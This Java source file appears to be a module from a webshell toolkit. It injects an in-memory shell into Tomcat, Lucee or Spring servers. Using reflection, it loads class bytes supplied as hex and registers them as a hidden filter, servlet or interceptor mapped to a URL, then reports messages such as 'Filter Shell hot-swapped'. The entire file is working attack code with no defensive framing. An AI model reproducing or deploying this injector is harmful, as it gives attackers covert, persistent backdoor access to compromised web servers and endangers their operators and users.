import java.io.*;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.Map;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class payload {
    public payload() {}

    private static String fnExtractJsonValue(String json, String key) {
        String pattern = "\"" + key + "\"\\s*:\\s*\"?([^\",}]+)\"?";
        Pattern r = Pattern.compile(pattern);
        Matcher m = r.matcher(json);
        if (m.find()) {
            return m.group(1).trim();
        }
        return "";
    }

    private static byte[] fnHexStringToByteArray(String hexStr) {
        if (hexStr == null || hexStr.trim().isEmpty()) return new byte[0];
        String clean = hexStr.toLowerCase().replaceAll("[\\\\,ox\\s\\r\\n]", "");
        int len = clean.length();
        if (len % 2 != 0) { clean += "0"; len++; }
        byte[] res = new byte[len / 2];
        for (int i = 0; i < len; i += 2) {
            res[i / 2] = (byte) Integer.parseInt(clean.substring(i, i + 2), 16);
        }
        return res;
    }

    public static String Execute(Object param) throws Exception {
        try {
            if (!(param instanceof java.util.Map)) {
                return "[-] ERROR: Param is not Map.";
            }
            java.util.Map<?, ?> mapParam = (java.util.Map<?, ?>) param;
            String szJson = (String) mapParam.get("json");

            Object objContext = mapParam.get("context");
            Object request = null;

            if (objContext instanceof Object[]) {
                Object[] arr = (Object[]) objContext;
                request = arr[0];
            } else {
                request = objContext;
            }

            if (request == null) {
                return "[-] ERROR: Cannot extract Request from nested context map.";
            }

            String szShellClassHex = fnExtractJsonValue(szJson, "shellClassHex");
            String szClassName = fnExtractJsonValue(szJson, "className");
            String szShellType = fnExtractJsonValue(szJson, "shellType");
            String szUrlPattern = fnExtractJsonValue(szJson, "urlPattern"); 

            if (szClassName.isEmpty()) szClassName = "AutomneGreet";
            if (szShellType.isEmpty()) szShellType = "tomcat_filter";

            Object session = request.getClass().getMethod("getSession", new Class[0]).invoke(request, new Object[0]);
            Object servletContext = session.getClass().getMethod("getServletContext", new Class[0]).invoke(session, new Object[0]);

            Field appctx = null;
            Class<?> ctxClazz = servletContext.getClass();
            while (ctxClazz != null) {
                try { appctx = ctxClazz.getDeclaredField("context"); break; } catch (Exception e) { ctxClazz = ctxClazz.getSuperclass(); }
            }
            appctx.setAccessible(true);
            Object applicationContext = appctx.get(servletContext);

            Field stdctx = applicationContext.getClass().getDeclaredField("context");
            stdctx.setAccessible(true);
            Object standardContext = stdctx.get(applicationContext);

            byte[] realClassBytes = fnHexStringToByteArray(szShellClassHex);
            ClassLoader contextLoader = Thread.currentThread().getContextClassLoader();
            java.net.URLClassLoader sandboxLoader = new java.net.URLClassLoader(new java.net.URL[0], contextLoader);
            Method defineClassMethod = ClassLoader.class.getDeclaredMethod("defineClass", new Class[]{byte[].class, int.class, int.class});
            defineClassMethod.setAccessible(true);

            String tomcatPackagePrefix = "org.apache.tomcat.util.descriptor.web";
            String servletPackagePrefix = "javax.servlet";
            try {
                Class.forName("org.apache.tomcat.util.descriptor.web.FilterDef");
            } catch (ClassNotFoundException e) {
                tomcatPackagePrefix = "org.apache.tomcat.util.descriptor.web"; 
                servletPackagePrefix = "jakarta.servlet";
            }

            if ("tomcat_filter".equalsIgnoreCase(szShellType)) {
                Field Configs = standardContext.getClass().getDeclaredField("filterConfigs");
                Configs.setAccessible(true);
                Map filterConfigs = (Map) Configs.get(standardContext);

                if (filterConfigs.get(szClassName) == null) {
                    Class<?> pulsarClass = (Class<?>) defineClassMethod.invoke(sandboxLoader, new Object[]{realClassBytes, 0, realClassBytes.length});
                    Object filter = pulsarClass.getConstructor(new Class[0]).newInstance(new Object[0]);

                    Class<?> filterDefClass = Class.forName(tomcatPackagePrefix + ".FilterDef");
                    Object filterDef = filterDefClass.getConstructor(new Class[0]).newInstance(new Object[0]);
                    
                    Class<?> filterInterface = Class.forName(servletPackagePrefix + ".Filter");
                    filterDefClass.getMethod("setFilter", new Class[]{filterInterface}).invoke(filterDef, new Object[]{filter});
                    filterDefClass.getMethod("setFilterName", new Class[]{String.class}).invoke(filterDef, new Object[]{szClassName});
                    filterDefClass.getMethod("setFilterClass", new Class[]{String.class}).invoke(filterDef, new Object[]{pulsarClass.getName()});

                    standardContext.getClass().getMethod("addFilterDef", new Class[]{filterDefClass}).invoke(standardContext, new Object[]{filterDef});

                    Class<?> filterMapClass = Class.forName(tomcatPackagePrefix + ".FilterMap");
                    Object filterMap = filterMapClass.getConstructor(new Class[0]).newInstance(new Object[0]);

                    String finalPattern = (szUrlPattern != null && !szUrlPattern.isEmpty()) ? szUrlPattern : "/Nihahahaha";
                    filterMapClass.getMethod("addURLPattern", new Class[]{String.class}).invoke(filterMap, new Object[]{finalPattern});
                    filterMapClass.getMethod("setFilterName", new Class[]{String.class}).invoke(filterMap, new Object[]{szClassName});
                    try { filterMapClass.getMethod("setDispatcher", new Class[]{String.class}).invoke(filterMap, new Object[]{"REQUEST"}); } catch (Exception ig) {}

                    standardContext.getClass().getMethod("addFilterMapBefore", new Class[]{filterMapClass}).invoke(standardContext, new Object[]{filterMap});

                    Class<?> configClass = Class.forName("org.apache.catalina.core.ApplicationFilterConfig");
                    Constructor<?> constructor = configClass.getDeclaredConstructor(new Class[]{Class.forName("org.apache.catalina.Context"), filterDefClass});
                    constructor.setAccessible(true);
                    Object filterConfig = constructor.newInstance(new Object[]{standardContext, filterDef});

                    filterConfigs.put(szClassName, filterConfig);
                    return "[+] SUCCESS: Filter Shell [" + szClassName + "] hot-swapped into Lucee container!";
                } else {
                    return "[!] WARN: Filter name already exists.";
                }
            }

            else if ("tomcat_servlet".equalsIgnoreCase(szShellType)) {
                Method mFindChildren = standardContext.getClass().getMethod("findChildren", new Class[0]);
                Object[] children = (Object[]) mFindChildren.invoke(standardContext, new Object[0]);
                boolean isExist = false;
                for (int i = 0; i < children.length; i++) {
                    Method mGetName = children[i].getClass().getMethod("getName", new Class[0]);
                    if (szClassName.equals(mGetName.invoke(children[i], new Object[0]))) { isExist = true; break; }
                }

                if (!isExist) {
                    Class<?> servletClass = (Class<?>) defineClassMethod.invoke(sandboxLoader, new Object[]{realClassBytes, 0, realClassBytes.length});
                    Object servletInstance = servletClass.getConstructor(new Class[0]).newInstance(new Object[0]);

                    Object wrapper = standardContext.getClass().getMethod("createWrapper", new Class[0]).invoke(standardContext, new Object[0]);
                    wrapper.getClass().getMethod("setName", new Class[]{String.class}).invoke(wrapper, new Object[]{szClassName});
                    wrapper.getClass().getMethod("setLoadOnStartup", new Class[]{int.class}).invoke(wrapper, new Object[]{1});
                    
                    Class<?> servletInterface = Class.forName(servletPackagePrefix + ".Servlet");
                    wrapper.getClass().getMethod("setServlet", new Class[]{servletInterface}).invoke(wrapper, new Object[]{servletInstance});
                    wrapper.getClass().getMethod("setServletClass", new Class[]{String.class}).invoke(wrapper, new Object[]{servletClass.getName()});

                    standardContext.getClass().getMethod("addChild", new Class[]{Class.forName("org.apache.catalina.Container")}).invoke(standardContext, new Object[]{wrapper});
                    String finalPattern = (szUrlPattern != null && !szUrlPattern.isEmpty()) ? szUrlPattern : "/ServletPulsar";
                    standardContext.getClass().getMethod("addServletMappingBefore", new Class[]{String.class, String.class}).invoke(standardContext, new Object[]{finalPattern, szClassName});

                    return "[+] SUCCESS: Servlet Shell [" + szClassName + "] deployed at " + finalPattern + "!";
                } else {
                    return "[!] WARN: Servlet name already exists.";
                }
            }

            else if ("spring_interceptor".equalsIgnoreCase(szShellType)) {
                String attrName = "org.springframework.web.servlet.FrameworkServlet.CONTEXT.dispatcherServlet";
                Object wac = servletContext.getClass().getMethod("getAttribute", new Class[]{String.class}).invoke(servletContext, new Object[]{attrName});
                if (wac == null) return "[-] ERROR: Not a Spring MVC environment.";

                Class<?> hmClass = Class.forName("org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping");
                Object handlerMapping = wac.getClass().getMethod("getBean", new Class[]{Class.class}).invoke(wac, new Object[]{hmClass});
                
                Field fInterceptors = null;
                Class<?> currentMappingClazz = handlerMapping.getClass();
                while (currentMappingClazz != null) {
                    try { fInterceptors = currentMappingClazz.getDeclaredField("adaptedInterceptors"); break; } catch (Exception e) { currentMappingClazz = currentMappingClazz.getSuperclass(); }
                }
                
                fInterceptors.setAccessible(true);
                java.util.List adaptedInterceptors = (java.util.List) fInterceptors.get(handlerMapping);

                Class<?> interceptorClass = (Class<?>) defineClassMethod.invoke(sandboxLoader, new Object[]{realClassBytes, 0, realClassBytes.length});
                Object interceptorInstance = interceptorClass.getConstructor(new Class[0]).newInstance(new Object[0]);

                adaptedInterceptors.add(0, interceptorInstance);
                return "[+] SUCCESS: Spring Interceptor Shell [" + szClassName + "] hooked!";
            }

            return "[-] ERROR: Unknown shellType strategy [" + szShellType + "].";

        } catch (Throwable th) {
            Throwable cause = th;
            if (th instanceof java.lang.reflect.InvocationTargetException) {
                cause = ((java.lang.reflect.InvocationTargetException) th).getTargetException();
            }
            return "[-] DESTROY_CRITICAL_ERROR: " + cause.toString();
        }
    }
}